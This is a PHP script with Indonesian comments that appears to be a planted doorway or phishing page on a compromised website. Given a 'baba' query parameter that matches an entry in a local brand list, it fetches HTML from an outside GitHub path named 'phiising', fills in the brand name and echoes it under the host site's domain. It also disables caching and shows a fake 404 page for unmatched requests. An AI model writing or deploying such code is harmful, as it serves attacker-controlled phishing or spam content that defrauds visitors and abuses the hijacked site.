<?php

function feedback404()
{
    header("HTTP/1.0 404 Not Found");
    echo "<center><h1><strong>Ilmu Tuhan</strong></h1></center>";
}

function getExternalContent($url) {
    $content = @file_get_contents($url);
    if ($content === false) {
        return "Gagal mengambil konten eksternal.";
    }
    return $content;
}

function normalizeInput($input) {
    return str_replace(' ', '-', strtolower(trim($input)));
}

function getBaseUrl() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $script_name = $_SERVER['SCRIPT_NAME'];
    $path = dirname($script_name);
    return "$protocol://$host$path";
}

if (isset($_GET['baba'])) {
    $original_baba = $_GET['baba'];
    $normalized_baba = normalizeInput($original_baba);

    if ($original_baba !== $normalized_baba) {
        $base_url = getBaseUrl();
        $redirect_url = "$base_url?baba=" . urlencode($normalized_baba);
        header("Location: $redirect_url", true, 301);
        exit();
    }

    $filename = "dewa.txt"; 
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); 

    $found = false;
    foreach ($lines as $item) {
        if (normalizeInput($item) === $normalized_baba) {
            $BRAND = strtoupper($item);
            $amp = $normalized_baba;
            $found = true;
            break;
        }
    }

    if ($found) {
        $BRANDS = $BRAND;
        $urlPath = getBaseUrl() . '?baba=' . urlencode($normalized_baba);

        $externalContent = getExternalContent("https://raw.githubusercontent.com/XJ303/konten/refs/heads/main/phiising/4.html");

        // Ganti placeholder dalam konten eksternal
        $externalContent = str_replace('<?php echo $BRAND ?>', $BRANDS, $externalContent);
        $externalContent = str_replace('<?php echo $urlPath ?>', $urlPath, $externalContent);
        $externalContent = str_replace('<?php echo $amp ?>', $amp, $externalContent);

        // Tambahkan header untuk menghindari caching
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");

        // Tampilkan konten yang sudah dimodifikasi
        echo $externalContent;
    } else {
        feedback404();
        exit();
    }
} else {
    // Jika parameter 'baba' tidak ada, tampilkan konten dari phiising/1.html
    $externalContent = getExternalContent("https://raw.githubusercontent.com/XJ303/konten/refs/heads/main/phiising/3.php");

    // Tambahkan header untuk menghindari caching
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");

    // Tampilkan konten yang diambil dari phiising/1.html
    echo $externalContent;
    exit();
}
?>
